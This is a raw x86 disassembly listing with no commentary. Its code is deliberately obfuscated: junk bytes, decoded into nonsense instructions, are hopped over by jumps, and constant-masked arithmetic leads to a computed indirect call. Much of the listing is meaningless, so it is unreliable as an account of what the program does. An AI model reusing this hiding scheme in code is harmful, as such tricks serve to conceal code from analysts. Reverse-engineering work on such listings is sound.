  410bb0:	in     eax,0xa2
  410bb2:	popa   
  410bb3:	jg     0x410b7c
  410bb5:	adc    eax,0x1a8a75d0
  410bba:	gs jnp 0x410baa
  410bbd:	mov    al,0x85
  410bc0:	out    dx,eax
  410bc1:	pop    es
  410bc2:	ret    0xb32
  410bc5:	push   ecx
  410bc6:	pusha  
  410bc7:	out    0x68,eax
  410bc9:	int3   
  410bca:	push   eax
  410bcb:	cli    
  410bcc:	or     DWORD PTR [edi],edx
  410bce:	dec    ebx
  410bcf:	mov    DWORD PTR [eax+0x0],eax
  410bd2:	icebp  
  410bd3:	pop    edi
  410bd4:	out    0x6d,al
  410bd6:	lock dec esp
  410bd8:	ins    BYTE PTR es:[edi],dx
  410bd9:	push   ds
  410bda:	and    al,0xa0
  410bdc:	fldenv [ebp-0x648db093]
  410be2:	ret    0xa29b
  410be5:	leave  
  410be6:	sub    DWORD PTR [edi-0x2],esi
  410be9:	push   ecx
  410bea:	das    
  410beb:	test   eax,0x793d8345
  410bf0:	call   0xce4a95cb
  410bf5:	xor    eax,0x304e10ac
  410bfa:	ret    0x8f35
  410bfd:	jno    0x410bbe
  410bff:	retf   0xd8f0
  410c02:	ret    
  410c03:	sar    BYTE PTR [ecx+0x7e],1
  410c06:	sub    BYTE PTR [edi],al
  410c08:	rol    BYTE PTR [ecx-0x7b],1
  410c0b:	out    dx,eax
  410c0c:	dec    edx
  410c0d:	rol    esp,0xf0
  410c10:	mov    esp,0x190f380c
  410c15:	shl    DWORD PTR [ecx-0x1e75fb08],1
  410c1b:	dec    ecx
  410c1c:	pop    ebx
  410c1d:	xchg   ebx,ecx
  410c1f:	sub    ebx,ecx
  410c21:	xchg   ebx,ecx
  410c23:	dec    ecx
  410c24:	mov    eax,DWORD PTR [ebp-0x1c]
  410c27:	imul   eax,ecx
  410c2a:	sub    esp,eax
  410c2c:	mov    DWORD PTR [ebp-0x24],esp
  410c2f:	mov    eax,DWORD PTR [ebp-0x4]
  410c32:	mov    ecx,0x7510853
  410c37:	xor    eax,ecx
  410c39:	mov    edx,0x32729a
  410c3e:	add    eax,edx
  410c40:	mov    DWORD PTR [ebp+0x8],eax
  410c43:	mov    eax,DWORD PTR [ebp-0x18]
  410c46:	xor    eax,ecx
  410c48:	add    eax,edx
  410c4a:	mov    edx,DWORD PTR [ebp+0x14]
  410c4d:	imul   eax,DWORD PTR [edx]
  410c50:	mov    edx,DWORD PTR [ebp-0x4]
  410c53:	xor    edx,ecx
  410c55:	mov    ecx,DWORD PTR [ebp+0x8]
  410c58:	lea    ecx,[edx+ecx*1+0x32729a]
  410c5f:	cmp    ecx,eax
  410c61:	je     0x411089
  410c67:	mov    edi,DWORD PTR [ebp-0x18]
  410c6a:	mov    eax,DWORD PTR [ebp+0x8]
  410c6d:	mov    edx,DWORD PTR [ebp+0x14]
  410c70:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  410c74:	jmp    0x410daf
  410c79:	sbb    DWORD PTR [eax+0x31],0x6d5dfd4a
  410c80:	jae    0x410c66
  410c82:	jb     0x410c33
  410c84:	pop    ds
  410c85:	push   esi
  410c86:	jae    0x410c9b
  410c88:	lea    esi,[edi]
  410c8a:	inc    esp
  410c8b:	jl     0x410d09
  410c8d:	adc    bh,BYTE PTR [edi+0x7c]
  410c90:	jl     0x410c3e
  410c92:	imul   esp
  410c94:	loop   0x410c1d
  410c96:	jmp    0x410c83
  410c98:	imul   esp,edx,0xc5d4d214
  410c9e:	dec    edx
  410c9f:	mov    dh,0xe1
  410ca1:	pop    ebp
  410ca2:	sbb    al,0xb2
  410ca4:	jmp    0x5ae51193
  410ca9:	loop   0x410c71
  410cab:	iret   
  410cac:	icebp  
  410cad:	fistp  QWORD PTR [eax-0x2c]
  410cb0:	cdq    
  410cb1:	mov    esi,0xae704da1
  410cb6:	and    esi,DWORD PTR [eax+0xed17b75]
  410cbc:	mov    ch,0x62
  410cbe:	sbb    BYTE PTR [esi+edi*1+0x1d],0x80
  410cc3:	mov    ecx,0x3e9001f8
  410cc8:	call   0x49fe6f0c
  410ccd:	pop    edi
  410cce:	push   edx
  410ccf:	fimul  WORD PTR [eax]
  410cd1:	fisttp WORD PTR [edi-0x78]
  410cd4:	xchg   esi,eax
  410cd5:	icebp  
  410cd6:	add    al,al
  410cd8:	loop   0x410c83
  410cda:	scas   eax,DWORD PTR es:[edi]
  410cdb:	add    al,0xf9
  410cdd:	fdivr  DWORD PTR [eax-0x24]
  410ce0:	cwde   
  410ce1:	adc    eax,DWORD PTR [ebx+0x6ab3ca03]
  410ce7:	sbb    BYTE PTR [ebx-0x24],al
  410cea:	pusha  
  410ceb:	jb     0x410c9d
  410ced:	add    eax,0x6697eadb
  410cf2:	ret    
  410cf3:	sub    al,0xe4
  410cf5:	mov    eax,0xb8d62a1f
  410cfa:	sbb    ebp,DWORD PTR [esi]
  410cfc:	add    eax,0x6b72430c
  410d01:	ins    DWORD PTR es:[edi],dx
  410d02:	sahf   
  410d03:	add    eax,0xc49260bf
  410d08:	jmp    0xa635c3fa
  410d0d:	or     edx,ebx
  410d0f:	fstp   QWORD PTR [ecx-0x1f]
  410d12:	mov    ch,0x5c
  410d14:	sub    BYTE PTR [edi-0x301c1fc],dh
  410d1a:	(bad)  
  410d1b:	jnp    0x410ccd
  410d1d:	shl    BYTE PTR [ecx],1
  410d1f:	enter  0x3b27,0x6
  410d23:	xor    al,BYTE PTR [edi+edi*1]
  410d26:	mov    eax,ds:0x7497a2d2
  410d2b:	inc    ecx
  410d2c:	mov    ebp,0xb640950d
  410d31:	retf   
  410d32:	jle    0x410d0a
  410d34:	pop    ecx
  410d35:	enter  0xed10,0xfb
  410d39:	jp     0x410cfa
  410d3b:	adc    DWORD PTR es:0x7d00d19,ebx
  410d42:	adc    ch,BYTE PTR [eax]
  410d44:	hlt    
  410d45:	sti    
  410d46:	ss xor al,0x44
  410d49:	pop    ecx
  410d4a:	or     eax,0x7564b492
  410d4f:	xor    edx,DWORD PTR [ebx+0x73]
  410d52:	add    DWORD PTR [edi-0x79],edi
  410d55:	jns    0x410db8
  410d57:	in     al,dx
  410d58:	and    dh,bl
  410d5a:	call   0x616f4e71
  410d5f:	lock repnz inc edi
  410d62:	out    0x55,al
  410d64:	pusha  
  410d65:	jo     0x410d85
  410d67:	jmp    0x410d4b
  410d69:	nop
  410d6a:	call   0xe791:0x6f58c0b8
  410d71:	aad    0xf1
  410d73:	xlat   BYTE PTR ds:[ebx]
  410d74:	sub    ebp,ecx
  410d76:	outs   dx,WORD PTR ds:[esi]
  410d78:	and    DWORD PTR [ecx+0x1f],0x47
  410d7c:	mov    gs,WORD PTR [ecx+ebp*4]
  410d7f:	sbb    DWORD PTR ds:0x227f3209,ecx
  410d85:	sub    DWORD PTR [ecx+0x3d7df255],eax
  410d8b:	hlt    
  410d8c:	iret   
  410d8d:	out    dx,eax
  410d8e:	out    0x4f,eax
  410d90:	jne    0x410df5
  410d92:	adc    BYTE PTR [ecx-0x2dd879b0],cl
  410d98:	lock aas 
  410d9a:	call   0xc290eeaf
  410d9f:	add    ebp,edi
  410da1:	jo     0x410d78
  410da3:	std    
  410da4:	jae    0x410e00
  410da6:	in     al,dx
  410da7:	xor    BYTE PTR [ecx],0x9d
  410daa:	mov    eax,ds:0xf0b1fa67
  410daf:	mov    ecx,0x7510853
  410db4:	xor    edx,edx
  410db6:	xor    edi,ecx
  410db8:	mov    esi,0x32729a
  410dbd:	add    edi,esi
  410dbf:	div    edi
  410dc1:	mov    edx,DWORD PTR [ebp-0x4]
  410dc4:	xor    edx,ecx
  410dc6:	lea    eax,[edx+eax*1+0x32729a]
  410dcd:	mov    edx,DWORD PTR [ebp+0x8]
  410dd0:	mov    edi,DWORD PTR [ebp-0x24]
  410dd3:	mov    DWORD PTR [edi+edx*4],eax
  410dd6:	mov    eax,DWORD PTR [ebp-0x18]
  410dd9:	mov    edx,DWORD PTR [ebp+0x8]
  410ddc:	xor    eax,ecx
  410dde:	lea    eax,[eax+edx*1+0x32729a]
  410de5:	mov    DWORD PTR [ebp+0x8],eax
  410de8:	mov    eax,DWORD PTR [ebp-0x18]
  410deb:	mov    edx,DWORD PTR [ebp+0x14]
  410dee:	xor    eax,ecx
  410df0:	jmp    0x410f2b
  410df5:	mov    ch,0xd5
  410df7:	or     dh,dh
  410df9:	push   0xd05d7df1
  410dfe:	sbb    DWORD PTR [ebx+0x414ed700],esi
  410e04:	mov    esi,0x7c7c47d5
  410e09:	adc    bh,BYTE PTR [edi+0x7c]
  410e0c:	jl     0x410e3f
  410e0e:	(bad)  
  410e0f:	repnz inc edi
  410e11:	lods   eax,DWORD PTR ds:[esi]
  410e12:	inc    ecx
  410e13:	das    
  410e14:	jne    0x651dd81b
  410e1a:	js     0x410e60
  410e1c:	loope  0x410da8
  410e1e:	dec    ecx
  410e1f:	adc    DWORD PTR ds:0x88b8fde3,esp
  410e25:	mov    ds:0xdee73a1a,eax
  410e2a:	jno    0x410e72
  410e2c:	mov    ?,ebp
  410e2e:	adc    BYTE PTR [esi+0x4],dh
  410e31:	out    0x5d,al
  410e33:	xchg   DWORD PTR [ecx],edx
  410e35:	sbb    ebp,edi
  410e37:	adc    al,dh
  410e39:	inc    ebp
  410e3a:	fwait
  410e3b:	xlat   BYTE PTR ds:[ebx]
  410e3c:	mov    edi,0x4d8d277f
  410e41:	adc    al,0xc0
  410e43:	shl    al,cl
  410e45:	xor    DWORD PTR [edx],0x7dcd5ed4
  410e4b:	int3   
  410e4c:	add    DWORD PTR [ebp+edi*1-0x49],edx
  410e50:	jo     0x410e7a
  410e52:	jp     0x410e4a
  410e54:	psrlw  mm1,mm5
  410e57:	pop    es
  410e58:	mov    al,ds:0xdac153ce
  410e5d:	add    eax,0x48f112ce
  410e62:	ficomp DWORD PTR [ebx]
  410e64:	scas   al,BYTE PTR es:[edi]
  410e65:	mov    ecx,?
  410e67:	rol    BYTE PTR [eax+eiz*1-0x7a4b63a5],1
  410e6e:	cwde   
  410e6f:	ins    BYTE PTR es:[edi],dx
  410e70:	xor    bl,BYTE PTR [edi-0x73]
  410e73:	xlat   BYTE PTR ds:[ebx]
  410e74:	popa   
  410e75:	cwde   
  410e76:	pop    esp
  410e77:	pusha  
  410e78:	je     0x410eb4
  410e7a:	sub    DWORD PTR [edx],edx
  410e7c:	sahf   
  410e7d:	ror    BYTE PTR [ecx-0x39],1
  410e80:	jb     0x410e48
  410e82:	cmp    ebx,DWORD PTR [ebx]
  410e84:	enter  0x2fc4,0xef
  410e88:	or     BYTE PTR [edx+0x281b11f],0x1c
  410e8f:	mov    edi,0xd3e55578
  410e94:	ss fmul st,st(7)
  410e97:	gs sbb eax,0x6715de45
  410e9d:	push   ds
  410e9e:	push   ss
  410e9f:	in     eax,0x68
  410ea1:	pop    ebp
  410ea2:	mov    ebp,0x3badf007
  410ea7:	rcl    ebx,cl
  410ea9:	adc    eax,0x63660d08
  410eae:	xchg   ebx,eax
  410eaf:	call   0x7e1a:0x933c87a3
  410eb6:	out    0x75,eax
  410eb8:	or     bl,ch
  410eba:	shl    DWORD PTR [edi-0x11],cl
  410ebd:	xor    dl,BYTE PTR [ebx+0x46c9972f]
  410ec3:	xor    al,0x6e
  410ec5:	adc    BYTE PTR [edi-0x51],ch
  410ec8:	sub    ah,BYTE PTR [edi-0x4c]
  410ecb:	stc    
  410ecc:	jo     0x410ed2
  410ece:	sbb    al,0x93
  410ed0:	cmp    al,0x7b
  410ed2:	sub    esp,DWORD PTR [ebx]
  410ed4:	or     ebx,edi
  410ed6:	pop    ss
  410ed7:	push   eax
  410ed8:	lahf   
  410ed9:	mov    bl,0x7c
  410edb:	jno    0x410eb5
  410edd:	cld    
  410ede:	into   
  410edf:	dec    edx
  410ee0:	lods   al,BYTE PTR ds:[esi]
  410ee1:	je     0x410ec7
  410ee3:	mov    eax,0x88bb1cfd
  410ee8:	push   ss
  410ee9:	adc    dh,BYTE PTR [ecx+0x30]
  410eec:	popf   
  410eed:	sub    DWORD PTR [ecx-0x7f],edx
  410ef0:	pop    ds
  410ef1:	sbb    ch,al
  410ef3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ef4:	mov    bl,0xd8
  410ef6:	jno    0x410e9e
  410ef8:	dec    esp
  410ef9:	adc    ah,BYTE PTR [ebp-0x21e6b430]
  410eff:	enter  0x2524,0xc2
  410f03:	xchg   DWORD PTR [ecx-0x4b],esp
  410f06:	(bad)  
  410f07:	mov    ?,WORD PTR [edx-0x6ce153f]
  410f0d:	inc    edi
  410f0e:	jle    0x81e252b1
  410f14:	cdq    
  410f15:	jbe    0x410f5a
  410f17:	addr16 sub cl,cl
  410f1a:	sub    BYTE PTR [ebp-0x4e],bh
  410f1d:	popa   
  410f1e:	add    ah,BYTE PTR [ecx+0x8]
  410f21:	mov    ds:0x4497d7ef,al
  410f26:	mov    al,ds:0xf0ddb509
  410f2b:	add    eax,esi
  410f2d:	imul   eax,DWORD PTR [edx]
  410f30:	mov    edx,DWORD PTR [ebp-0x4]
  410f33:	xor    edx,ecx
  410f35:	mov    ecx,DWORD PTR [ebp+0x8]
  410f38:	jmp    0x411073
  410f3d:	pop    eax
  410f3e:	shl    BYTE PTR [ebp+0x13],0x7d
  410f42:	mov    ebp,0x8c3c7362
  410f47:	cmp    cl,al
  410f49:	or     esp,ebx
  410f4b:	sbb    ebp,ecx
  410f4d:	jmp    0x410f95
  410f4f:	jl     0x410fcd
  410f51:	adc    bh,BYTE PTR [edi+0x7c]
  410f54:	jl     0x410edc
  410f56:	in     al,dx
  410f57:	fild   WORD PTR [eax+0x2b]
  410f5a:	mov    ch,ah
  410f5c:	scas   eax,DWORD PTR es:[edi]
  410f5d:	aad    0xf3
  410f5f:	add    ebp,DWORD PTR [edx]
  410f61:	jl     0x410efb
  410f63:	fs cli 
  410f65:	and    DWORD PTR [ecx+0x31],0x3e
  410f69:	xchg   ebx,eax
  410f6a:	aas    
  410f6b:	inc    esi
  410f6c:	repz mov edi,0x4e646340
  410f72:	sub    al,0xd7
  410f75:	mov    WORD PTR [ebx],?
  410f77:	xchg   ecx,eax
  410f78:	push   ds
  410f79:	push   cs
  410f7a:	or     DWORD PTR ds:0xac725d38,edi
  410f80:	imul   ebx,ebx,0x543aa96
  410f86:	add    DWORD PTR [ebp-0x449f1b7c],0x6d786a70
  410f90:	mov    bl,0xff
  410f92:	push   ebp
  410f93:	scas   eax,DWORD PTR es:[edi]
  410f94:	dec    ebx
  410f95:	xchg   ecx,eax
  410f96:	pop    ecx
  410f97:	aam    0x52
  410f99:	inc    eax
  410f9a:	mov    eax,DWORD PTR [ebp-0x3a]
  410f9d:	daa    
  410f9e:	out    0x4c,eax
  410fa0:	cwde   
  410fa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fa2:	mov    ds:0xddd4aa54,al
  410fa7:	ret    0x23b5
  410faa:	push   edx
  410fab:	fsub   st,st(1)
  410fad:	jle    0x410f6d
  410faf:	inc    esi
  410fb0:	push   ebp
  410fb1:	pop    ebp
  410fb2:	and    eax,0x1f32dbc0
  410fb7:	jp     0x411009
  410fb9:	arpl   WORD PTR [esp+ebx*1-0x21],dx
  410fbd:	mov    edx,0x793451eb
  410fc2:	jne    0x410f67
  410fc4:	adc    esp,DWORD PTR [edi+ebp*8]
  410fc7:	outs   dx,BYTE PTR ss:[esi]
  410fc9:	mov    dh,ah
  410fcb:	pop    esi
  410fcc:	dec    esp
  410fcd:	push   ds
  410fce:	jb     0x410fea
  410fd0:	dec    ebx
  410fd1:	cmp    dh,BYTE PTR [ecx+eiz*8-0x50]
  410fd5:	adc    al,0x9a
  410fd7:	xchg   edi,eax
  410fd8:	fistp  WORD PTR [ecx-0x408f6641]
  410fde:	push   0xd1252d4f
  410fe3:	sbb    DWORD PTR [ebx],ebp
  410fe5:	out    0x17,al
  410fe7:	adc    bl,BYTE PTR fs:[edi]
  410fea:	out    0x6d,al
  410fec:	shl    BYTE PTR ds:0x8b03a4bd,1
  410ff2:	jno    0x410fa3
  410ff4:	mov    ecx,ecx
  410ff6:	pushf  
  410ff7:	add    DWORD PTR [ebx-0x148a21b9],esp
  410ffd:	imul   ebx,DWORD PTR [edi+edx*1-0x4a2cb6e8],0xffffffe6
  411005:	(bad)  
  411006:	xlat   BYTE PTR ds:[ebx]
  411007:	and    cl,BYTE PTR [esi+0x1]
  41100a:	and    BYTE PTR [edx+0x1d],bl
  41100d:	add    bl,cl
  41100f:	dec    ebx
  411010:	xchg   ebp,eax
  411011:	pusha  
  411012:	lods   eax,DWORD PTR ds:[esi]
  411013:	fistp  DWORD PTR [esi]
  411015:	adc    al,BYTE PTR [esp-0x68828539]
  41101c:	mov    ds:0x1ab77fe8,al
  411021:	push   es
  411022:	and    dl,BYTE PTR [ecx-0x13]
  411025:	jae    0x411042
  411027:	pop    ds
  411028:	push   0x98b2fc12
  41102d:	jge    0x411010
  41102f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411030:	aaa    
  411031:	das    
  411032:	(bad)  
  411033:	xor    ah,BYTE PTR [eax+0x4a]
  411036:	add    BYTE PTR [ebx+0x26],bl
  411039:	int    0x29
  41103b:	(bad)  
  41103d:	push   ds
  41103e:	adc    ch,bl
  411040:	mov    dh,0xfc
  411042:	sbb    bl,BYTE PTR [esi-0x3a]
  411045:	sub    ebp,DWORD PTR [ecx-0x2e]
  411048:	jo     0x41105e
  41104a:	push   ebp
  41104b:	inc    ebx
  41104c:	hlt    
  41104d:	and    eax,0x2ed01280
  411052:	adc    ah,BYTE PTR [ebx+0x4dcb3d54]
  411058:	icebp  
  411059:	push   esi
  41105a:	fnstcw WORD PTR [edi+0x2a]
  41105d:	int3   
  41105e:	mov    dh,0xbf
  411060:	lea    esi,[edi+0x56]
  411063:	dec    ecx
  411064:	dec    esi
  411065:	mov    ebx,0x9bfc95ae
  41106a:	or     eax,0xc84b615d
  41106f:	cs inc ebx
  411071:	dec    ecx
  411072:	call   0x9a4b9d04
  411077:	jb     0x4110ab
  411079:	add    BYTE PTR [ebx],bh
  41107b:	enter  0x850f,0xe5
  41107f:	sti    
  411080:	(bad)  
  411081:	dec    DWORD PTR [ebx+0x5e9de]
  411087:	add    BYTE PTR [eax],al
  411089:	mov    ebx,0x32729a
  41108e:	mov    eax,DWORD PTR [ebp-0x4]
  411091:	xor    eax,0x7510853
  411096:	add    eax,ebx
  411098:	mov    DWORD PTR [ebp-0xc],eax
  41109b:	xor    ebx,ebx
  41109d:	lea    eax,[ebp-0x10]
  4110a0:	jmp    0x4111db
  4110a5:	into   
  4110a6:	aas    
  4110a7:	in     eax,0x49
  4110a9:	cmc    
  4110aa:	jne    0x411116
  4110ac:	mov    edi,0x9e11fbf4
  4110b1:	stos   BYTE PTR es:[edi],al
  4110b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110b3:	xor    al,0xf
  4110b5:	mov    DWORD PTR [ecx+0x7c],eax
  4110b8:	jl     0x4110cc
  4110ba:	jg     0x411138
  4110bc:	jl     0x411106
  4110be:	adc    ebx,DWORD PTR [edx+0x61]
  4110c1:	sub    cl,dl
  4110c3:	cmp    ch,BYTE PTR [eax-0x72]
  4110c6:	int    0x2c
  4110c8:	xor    BYTE PTR [ebp-0x7f4b95c1],ch
  4110ce:	test   bh,al
  4110d0:	cli    
  4110d1:	popf   
  4110d2:	out    0xc6,al
  4110d4:	cli    
  4110d5:	popf   
  4110d6:	ins    BYTE PTR es:[edi],dx
  4110d7:	stos   BYTE PTR es:[edi],al
  4110d8:	pushf  
  4110d9:	retf   0xe7b5
  4110dc:	jo     0x411092
  4110de:	pop    edi
  4110df:	adc    bh,BYTE PTR [eax+0x657cf434]
  4110e5:	add    BYTE PTR [edi-0x6d],cl
  4110e8:	jp     0x4110c5
  4110ea:	loope  0x411169
  4110ec:	and    eax,0xd6c82e87
  4110f1:	xchg   esi,eax
  4110f2:	xchg   DWORD PTR [ecx],ebp
  4110f4:	mov    eax,ds:0x4bf35708
  4110f9:	rol    DWORD PTR [edx-0xa767f15],cl
  4110ff:	inc    ecx
  411100:	and    esp,ecx
  411102:	push   esi
  411103:	jnp    0x411182
  411105:	mov    ecx,0xaaae9250
  41110a:	jmp    0x7528f517
  41110f:	enter  0x5f8d,0x1c
  411113:	mov    eax,ds:0x71173f07
  411118:	and    eax,0x8e21d625
  41111d:	gs in  eax,0x17
  411120:	xor    bl,BYTE PTR [edx-0x73bea58]
  411126:	or     ebp,eax
  411128:	cmp    eax,0xffeb32bc
  41112d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41112e:	add    esp,edx
  411130:	jl     0x41113f
  411132:	dec    ebx
  411133:	xchg   edi,eax
  411134:	push   DWORD PTR [ebp+0x42]
  411137:	sbb    eax,0x11faae91
  41113c:	sbb    ebp,DWORD PTR [ecx]
  41113e:	sbb    BYTE PTR [ebp-0x5f],0x5d
  411142:	push   ss
  411143:	sar    DWORD PTR [eax],0xba
  411146:	das    
  411147:	xchg   edx,edi
  411149:	mov    edx,0xaf6b01d9
  41114e:	iret   
  41114f:	stc    
  411150:	or     BYTE PTR [esi],ch
  411152:	sti    
  411153:	int    0xae
  411155:	dec    ecx
  411156:	shl    BYTE PTR [ecx-0x55],cl
  411159:	mov    DWORD PTR [ebx-0x4f],edx
  41115c:	push   edi
  41115d:	shl    DWORD PTR [esi-0x502b2a9],cl
  411163:	pop    edx
  411164:	or     edx,DWORD PTR [edx+0x0]
  411167:	sbb    DWORD PTR [ebp+0x68],0xd553af7f
  41116e:	(bad)  
  41116f:	out    0x5c,eax
  411171:	inc    edi
  411172:	inc    esp
  411173:	sbb    esp,DWORD PTR [edx+0x79]
  411176:	js     0x4111ef
  411178:	imul   esp,DWORD PTR [edx-0x19652e8f],0x26f043c6
  411182:	dec    eax
  411183:	mov    al,ds:0x9ea4aefc
  411188:	out    dx,eax
  411189:	xchg   ebp,eax
  41118a:	out    dx,eax
  41118b:	xchg   ebx,eax
  41118c:	ins    BYTE PTR es:[edi],dx
  41118d:	xchg   esi,eax
  41118e:	and    BYTE PTR [edi],al
  411190:	sub    esi,DWORD PTR [ecx+0x3dae5aa5]
  411196:	je     0x41111e
  411198:	dec    edi
  411199:	pop    eax
  41119a:	or     dh,al
  41119c:	not    BYTE PTR [ecx-0x23f7b1b0]
  4111a2:	fst    QWORD PTR [ecx]
  4111a4:	or     BYTE PTR [edi],dh
  4111a6:	arpl   WORD PTR [edi-0x69],dx
  4111a9:	jne    0x411153
  4111ab:	cmp    DWORD PTR fs:[edi+ebp*1+0x60f33387],esi
  4111b3:	push   ebx
  4111b4:	cmp    al,0x47
  4111b6:	ja     0x4111e7
  4111b8:	call   0x20cc:0xad37721a
  4111bf:	bound  ebx,QWORD PTR [ecx+0x1943e12]
  4111c5:	rcr    BYTE PTR [edx+0x4e13bbba],cl
  4111cb:	lods   eax,DWORD PTR ds:[esi]
  4111cc:	mov    esp,0xbe23bc8
  4111d1:	pop    edx
  4111d2:	arpl   WORD PTR [esi],sp
  4111d4:	jmp    0x41121a
  4111d6:	mov    eax,0x425ef71a
  4111db:	add    ebx,DWORD PTR [eax]
  4111dd:	call   ebx
  4111df:	xor    ebx,ebx
  4111e1:	inc    ebx
  4111e2:	cmp    DWORD PTR [ebp+0x10],ebx
  4111e5:	je     0x41133e
  4111eb:	xchg   edx,eax
  4111ec:	jmp    0x411327
  4111f1:	push   ecx
  4111f2:	(bad)  
  4111f3:	fsub   st(2),st
  4111f5:	imul   esi,edx,0x2efa635d
  4111fb:	enter  0xe45a,0x3d
  4111ff:	call   0x7c81c1da
  411204:	jl     0x411218
  411206:	jg     0x411284
  411208:	jl     0x411226
  41120a:	fsub   QWORD PTR [ebp+0x0]
  41120d:	mov    edx,0x2a60a68
  411212:	ret    
  411213:	mov    ds:0xfaffd763,eax
  411218:	loopne 0x411237
  41121a:	das    
  41121b:	sbb    bl,al
  41121d:	stos   DWORD PTR es:[edi],eax
  41121e:	rcl    BYTE PTR [ecx-0x2],0xb8
  411222:	inc    ebp
  411223:	stc    
  411224:	jle    0x41126c
  411226:	stos   DWORD PTR es:[edi],eax
  411227:	jne    0x411209
  411229:	retf   0xfacb
  41122c:	mov    ebp,0x677d9995
  411231:	jg     0x411296
  411233:	or     BYTE PTR [ecx-0x5265c635],ch
  411239:	test   DWORD PTR [ebx],eax
  41123b:	pop    ecx
  41123c:	push   eax
  41123d:	and    ch,al
  41123f:	pop    es
  411240:	hlt    
  411241:	push   ds
  411242:	bnd ja 0x4111ee
  411245:	xor    cl,BYTE PTR [esi-0x5889921]
  41124b:	push   ebx
  41124c:	sub    ch,dl
  41124e:	call   0x1888:0xed79ff87
  411255:	pop    ss
  411256:	ins    DWORD PTR es:[edi],dx
  411257:	sub    ebp,eax
  411259:	into   
  41125a:	pop    ecx
  41125b:	mov    eax,0x3b39cd6
  411260:	jo     0x411201
  411262:	pop    esp
  411263:	test   bh,bh
  411265:	jecxz  0x4111f5
  411267:	mov    edi,gs
  411269:	bound  esi,QWORD PTR [edx]
  41126b:	int    0x9
  41126d:	fldcw  WORD PTR [ebp-0x668ccbd5]
  411273:	sub    ebx,eax
  411275:	mov    ?,WORD PTR es:[edx+edi*4]
  411279:	sub    eax,esp
  41127b:	jp     0x4112a2
  41127d:	pop    edx
  41127e:	scas   al,BYTE PTR es:[edi]
  41127f:	mov    WORD PTR gs:[ecx],?
  411282:	cmc    
  411283:	and    dl,ah
  411285:	push   es
  411286:	cmp    bh,BYTE PTR [esi+ecx*2-0x61]
  41128a:	in     eax,dx
  41128b:	mov    dh,BYTE PTR [ebx-0x13b2f193]
  411291:	adc    DWORD PTR [esi+ebx*4],edi
  411294:	or     DWORD PTR [ebx],esp
  411296:	repnz xor eax,eax
  411299:	fnstcw WORD PTR ds:0x7325aaa
  41129f:	dec    ebp
  4112a0:	cs push ebx
  4112a2:	xlat   BYTE PTR ds:[ebx]
  4112a3:	ss test eax,0xdf682b41
  4112a9:	scas   eax,DWORD PTR es:[edi]
  4112aa:	dec    ecx
  4112ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112ac:	movaps xmm3,XMMWORD PTR [edx+0xb]
  4112b0:	mov    edi,0xe1b440c6
  4112b5:	pushf  
  4112b6:	mov    ebp,0x60dc33a2
  4112bb:	mov    dl,0x7
  4112bd:	mov    ds:0xf4be93eb,eax
  4112c2:	popa   
  4112c3:	inc    ebx
  4112c4:	xchg   ebx,eax
  4112c5:	fwait
  4112c6:	repz (bad) 
  4112c8:	mov    cl,0x10
  4112ca:	mov    esp,0x2f4ee784
  4112cf:	or     eax,0xff633dfa
  4112d4:	nop
  4112d5:	push   ds
  4112d6:	jp     0x41127a
  4112d8:	sub    eax,0xf64e6002
  4112dd:	or     al,0x13
  4112df:	and    dh,bh
  4112e1:	cdq    
  4112e2:	xchg   ebx,eax
  4112e3:	int    0xb7
  4112e5:	das    
  4112e6:	push   ebx
  4112e7:	pop    es
  4112e8:	mov    bl,0x14
  4112ea:	loopne 0x4112b4
  4112ec:	cdq    
  4112ed:	sub    bl,BYTE PTR [esi]
  4112ef:	adc    eax,0x5078b6d
  4112f4:	push   ebx
  4112f5:	inc    edi
  4112f6:	xchg   esp,eax
  4112f7:	mov    bh,0x4a
  4112f9:	and    bh,ah
  4112fb:	xor    cl,dl
  4112fd:	shr    BYTE PTR [ecx+0x364446c8],0xae
  411304:	jecxz  0x4112e7
  411306:	mov    cl,0x13
  411308:	ins    DWORD PTR es:[edi],dx
  411309:	jg     0x4112d4
  41130b:	(bad)  
  41130c:	das    
  41130d:	mov    ebx,0x54b4fecd
  411312:	les    eax,FWORD PTR ds:0x75f0cdc3
  411318:	fwait
  411319:	int3   
  41131a:	mov    ebx,edx
  41131c:	cmc    
  41131d:	hlt    
  41131e:	sar    DWORD PTR [ebx-0x6f],cl
  411321:	add    DWORD PTR [eax],ebx
  411323:	cli    
  411324:	cmp    edi,DWORD PTR [ebx+0x590a6ab2]
  41132a:	push   0x4
  41132c:	pop    ebx
  41132d:	inc    ebx
  41132e:	xchg   ebx,ecx
  411330:	sub    ebx,ecx
  411332:	xchg   ebx,ecx
  411334:	dec    ecx
  411335:	mov    eax,DWORD PTR [ebp-0x1c]
  411338:	imul   eax,ecx
  41133b:	add    esp,eax
  41133d:	xchg   edx,eax
  41133e:	push   eax
  41133f:	xor    ebx,ebx
  411341:	mov    edx,esp
  411343:	jmp    0x41147e
  411348:	sub    BYTE PTR [edi+0x7165615e],cl
  41134e:	xor    ebx,DWORD PTR [ebp-0x7b]
  411351:	into   
  411352:	jge    0x411370
  411354:	je     0x411355
  411356:	push   esp
  411357:	adc    DWORD PTR [ebp+0x43],ecx
  41135a:	jl     0x4113d8
  41135c:	adc    bh,BYTE PTR [edi+0x7c]
  41135f:	jl     0x4112e8
  411361:	fadd   DWORD PTR [ebx-0x29]
  411364:	and    BYTE PTR [ecx-0x1229f395],bh
  41136a:	jmp    0x8b35a386
  41136f:	mov    bh,BYTE PTR [ebp+0x62]
  411372:	or     al,0x2b
  411374:	mov    ah,al
  411376:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411377:	cmp    al,0x32
  411379:	mov    al,dl
  41137b:	pop    edx
  41137c:	or     eax,ebx
  41137e:	push   ebx
  41137f:	mov    BYTE PTR [ebp-0x6aca4cf0],dl
  411385:	mov    ecx,0xdbf85db1
  41138a:	ins    DWORD PTR es:[edi],dx
  41138b:	cmp    bh,BYTE PTR [edx+0x95edc87]
  411391:	out    0xfa,al
  411393:	pop    ecx
  411394:	mov    eax,ds:0x906a2445
  411399:	adc    al,0xe1
  41139b:	mov    BYTE PTR [ebx-0x17233846],ch
  4113a1:	addr16 (bad) 
